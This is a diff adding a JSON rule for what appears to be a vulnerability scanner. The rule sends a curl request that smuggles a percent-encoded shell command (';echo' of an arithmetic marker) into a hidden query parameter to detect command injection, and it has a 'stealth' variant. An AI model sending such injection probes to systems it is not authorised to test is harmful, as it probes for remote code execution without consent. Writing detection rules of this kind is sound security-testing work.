@@ -1,0 +1,35 @@
+{
+  "id": "R-VULN-CMDI-PROBE-001",
+  "name": "Shell command execution behind a confirmed hidden parameter",
+  "category": "vuln",
+  "when": {
+    "all": [
+      {
+        "fact": "class",
+        "op": "contains",
+        "value": "hidden_param"
+      },
+      {
+        "fact": "has_param",
+        "op": "eq",
+        "value": true
+      }
+    ]
+  },
+  "then": {
+    "hypothesis": "Ask the confirmed hidden parameter one question: did a SHELL run a command appended to its value? The payload is one command terminator plus an arithmetic echo (;echo $((1339*1339)), percent-encoded because curl does not encode a query for us) and the only oracle is the exact marker 1792921 standing alone in the response body -- the payload echoed back, encoded or decoded, proves only that the request arrived, and the same seven digits inside a trace id prove nothing, so neither is a hit. There is deliberately no delay oracle: one action yields one observation, so there is no recorded baseline to measure a duration against. The probe stops at the echo -- it holds no session inside the target and runs nothing further there. The has_param gate guarantees a query string, so the parameter is appended with & and rendered through hyp.param; obs_url carries the same value so the minted finding has a url the OOB validator can re-send through.",
+    "actions": [
+      {
+        "tool": "curl",
+        "cmd": "curl -sS -m 10 -A '{ua}' '{url}&{param}=%3Becho%20%24%28%281339*1339%29%29'",
+        "cmd_stealth": "curl -sS -m 5 -A '{ua}' '{url}&{param}=%3Becho%20%24%28%281339*1339%29%29'",
+        "obs_url": "{url}&{param}=%3Becho%20%24%28%281339*1339%29%29"
+      }
+    ],
+    "on_hit_class": "rce",
+    "priority": {
+      "impact": 0.9,
+      "cost": 0.1
+    }
+  }
+}
